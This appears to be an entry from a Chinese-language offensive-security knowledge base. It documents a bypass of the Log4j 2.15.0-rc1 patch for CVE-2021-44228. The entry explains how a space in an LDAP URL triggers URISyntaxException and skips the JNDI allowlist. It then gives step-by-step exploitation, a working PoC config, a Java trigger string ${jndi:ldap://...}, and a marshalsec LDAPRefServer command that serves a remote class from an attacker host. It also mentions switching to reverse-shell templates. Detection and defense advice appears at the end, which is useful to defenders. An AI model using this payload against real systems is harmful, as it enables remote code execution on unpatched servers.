---
id: web-java-deserialization-jndi-log4j2-rc1-lookups-urisyntaxexception-bypass
title: Log4j 2.15.0-rc1 绕过：开启 lookups 后利用 URI 空格触发 URISyntaxException 跳过 JNDI 白名单
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: log4j2-rc1-lookups-urisyntaxexception-jndi-bypass
tags:
- java
- log4j2
- jndi
- ldap
- rce
- bypass
- cve-2021-44228
- lookups
- urisyntaxexception
cve:
- CVE-2021-44228
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: Apache Log4j 2.15.0-rc1（原文实测；rc2 修复 URI 异常分支，2.16.0 移除 lookups）
verification:
  verified_by: verifier-V647
  verified_at: '2026-11-13T03:50:33+08:00'
  notes: 已对照原文与28张截图核对：原文明确实验 2.15.0-rc1（github release 编译），图15-21 证实 SimpleMessagePatternConverter 默认、%msg{lookups} 触发 LookupMessagePatternConverter、allowedProtocols=[java,ldap,ldaps]、allowedHosts=25、allowedClasses=9；图22 证实空格 URL ldap://127.0.0.1:9999/ test 在 new URI 抛 URISyntaxException 后 catch 为空并继续 context.lookup(name)；图23 为 rc2 commit 增加 LOGGER.warn+return null；图24 为 2.16.0 删除 LookupMessagePatternConverter。affected_versions（rc1 实测、rc2 修复、2.16.0 移除）与原文一致，已随卡写入。dedup 首条为草稿自身（已入库同 id）；log4j2-login-rce/solr/symphony 均为其他版本/入口，非同链；dup-scan 无涉及 pair。cve 字段沿用母漏洞 CVE-2021-44228（本绕过无独立 CVE）。未复跑 PoC（依赖 LDAPRefServer 与 JDK 远程 codebase 条件）。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-log4j2-rc1-lookups-urisyntaxexception-bypass/
draft: false
kb_aliases:
- 2.15.0-rc1 绕过
- LookupMessagePatternConverter
- '%msg{lookups}'
- URISyntaxException 绕过 JNDI 白名单
- JndiManager allowedHosts 绕过
- Log4Shell 补丁绕过
---

# 一句话结论

Log4j 2.15.0-rc1 默认关闭消息 lookups 并对 JNDI 协议/主机/类做白名单，但这两层都可绕过：在 PatternLayout 中写 `%msg{lookups}` 重新开启 lookups 后，`${jndi:ldap://attacker:port/ payload}` 里的空格会让 `JndiManager.lookup` 中 `new URI(name)` 抛 `URISyntaxException`，而 catch 块没有 return，代码继续执行到最后的 `context.lookup(name)`，JNDI/LDAP 解析时忽略该空格，仍然连到攻击者 LDAP 加载远程类，实现 RCE。

# 原理

- **rc1 的第一层缓解**：`MessagePatternConverter` 被拆成 `SimpleMessagePatternConverter`/`FormattedMessagePatternConverter`/`LookupMessagePatternConverter`/`RenderingPatternConverter`。默认使用 `SimpleMessagePatternConverter`，其 `format` 只做 `formatTo(toAppendTo)`，不再查找 `${`；只有当配置里带 `lookups` 选项（如 `<PatternLayout pattern="%msg{lookups}%n"/>`）时，`MessagePatternConverter.newInstance` 才会用 `LookupMessagePatternConverter` 包装，其 `format` 调用 `config.getStrSubstitutor().replaceIn(...)` 重新引入插值。
- **rc1 的第二层缓解**：`JndiManager.lookup(name)` 先用 `new URI(name)` 解析，检查 `uri.getScheme()` 是否在 `allowedProtocols`（默认 ldap/ldaps 等）、LDAP 主机是否在 `allowedHosts`（`allowedLdapHosts` 属性 + 永久白名单）、反序列化类是否在 `allowedClasses`；不满足就告警并返回 null。
- **绕过点**：这段检查整体包在 `try { ... } catch (URISyntaxException e) { }` 中，catch 块为空；检查之后（try/catch 之外）才是 `return this.context.lookup(name);`。在 LDAP URL 中插入一个空格（如 `ldap://127.0.0.1:9999/ test`）会让 `new URI(name)` 抛 `URISyntaxException`，所有白名单检查被跳过；随后 `context.lookup(name)` 仍以原始 name 调用。JNDI LDAP provider 在解析时会处理/忽略空格，实际仍请求攻击者 LDAP 服务，返回带 `javaCodebase`/`javaFactory` 的 Reference，触发远程类加载。
- **为什么仍能执行**：rc1 只是把入口收窄到"显式开启 lookups"的场景并对 JNDI 目标加白名单，没有在异常路径上终止；一旦攻击者能控制日志消息且目标配置开启了 lookups，还是回到 Log4Shell 的 JNDI 注入链。
- **后续修复**：2.15.0-rc2 在 `URISyntaxException` 分支加 `return null`；2.15.1-rc1 默认禁用 JNDI；2.16.0 完全移除 lookups 与 `LookupMessagePatternConverter`；CVE-2021-45046 还涉及 2.15.0-rc2 及更早版本在特定配置下的 DoS。

# 触发条件

- 目标使用 Apache Log4j 2.15.0-rc1（或行为相同的早期修复版本）。
- 日志 PatternLayout 显式开启 lookups（`%msg{lookups}`），或通过配置把 lookups 打开；这是默认关闭后的必要条件。
- 攻击者可控输入会被记录到该 logger/pattern。
- 目标能访问攻击者 LDAP 服务；JDK 允许远程 codebase，或目标 classpath 有可用的本地 gadget/二次反序列化链。
- 攻击者能在 JNDI URL 中引入空格（HTTP 参数、Header 等通常都可以）。

# 利用步骤

1. 确认目标为 2.15.0-rc1 且日志配置开启 lookups（例如应用自定义 `%msg{lookups}`；默认配置不含该选项，需存在此类配置才成立）。
2. 搭建 LDAP reference 服务（marshalsec `LDAPRefServer`/JNDIExploit），准备返回带远程 codebase 的恶意类或本地 gadget 链。
3. 在可控字段中提交带空格的 JNDI 串，例如 `${jndi:ldap://ATTACKER:9999/ test}`；空格放在路径部分。
4. 观察目标 LDAP 连接与类加载/命令执行；若 JDK 禁用远程 codebase，改用目标 classpath 上的 gadget 或二次反序列化。
5. 验证命令执行权限，按需换反弹 shell 模板。

# PoC

```xml
<!-- log4j2 配置：显式开启 lookups，rc1 才会使用 LookupMessagePatternConverter -->
<Configuration status="warn" name="MyApp" packages="">
  <appenders>
    <console name="STDOUT" target="SYSTEM_OUT">
      <PatternLayout pattern="%msg{lookups}%n"/>
    </console>
  </appenders>
  <Loggers>
    <Root level="error"><AppenderRef ref="STDOUT"/></Root>
  </Loggers>
</Configuration>
```

```java
// 触发：URL 路径中带空格，使 new URI(name) 抛 URISyntaxException，跳过 JndiManager 白名单
public class RC1Bypass {
    public static final Logger logger = LogManager.getLogger(RC1Bypass.class);
    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:9999/ test}");
    }
}
```

```bash
# 攻击侧：LDAP reference 服务（marshalsec 等价实现），监听 9999
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8000/#Exploit" 9999
```

# 变体与关联

- 与 [[web-java-deserialization-jndi-log4j2-login-rce]]：该卡是 CVE-2021-44228 原始版本的正常利用；本卡专讲 2.15.0-rc1 修复后的双重绕过，前置不同。
- 与 [[web-java-deserialization-jndi-solr-cores-indexinfo-log4j2-rce]]、[[web-java-framework-symphony-article-type-log4j2-jndi-rce]]：均为具体产品入口的 Log4Shell；本卡是版本修复绕过。
- 后续版本差异：2.15.0-rc2 在 catch 中 return；2.15.1 默认禁用 JNDI；2.16.0 移除 lookups；2.17.x 修复 CVE-2021-45105 等。CVE-2021-45046 涉及 2.15.0-rc2 及更早版本的特定配置 DoS。
- 绕过变体：JDK 高版本禁用 `trustURLCodebase` 时改走本地 gadget（BeanFactory/EL、Tomcat MemoryUserDatabaseFactory 等，见 JNDI 目录其他卡）。

# 检测与防御

- 检测：日志配置中出现 `%msg{lookups}` 或等价 lookups 选项；应用出现 `${jndi:` 字样的日志输入；出站 LDAP/RMI 连接与远程 codebase 下载；异常 `URISyntaxException` 告警与随后 JNDI 查询。
- 防御：升级到 Log4j 2.17.1+（或至少 2.15.0-rc2 并继续升级）；不要开启 lookups；移除 `JndiLookup`/禁用 JNDI（`log4j2.disable.jndi=true`）；限制应用出站到 LDAP/RMI 的访问；WAF 拦截 `${jndi:`/`${` 变体并做规范化；对日志输入做转义与长度限制。
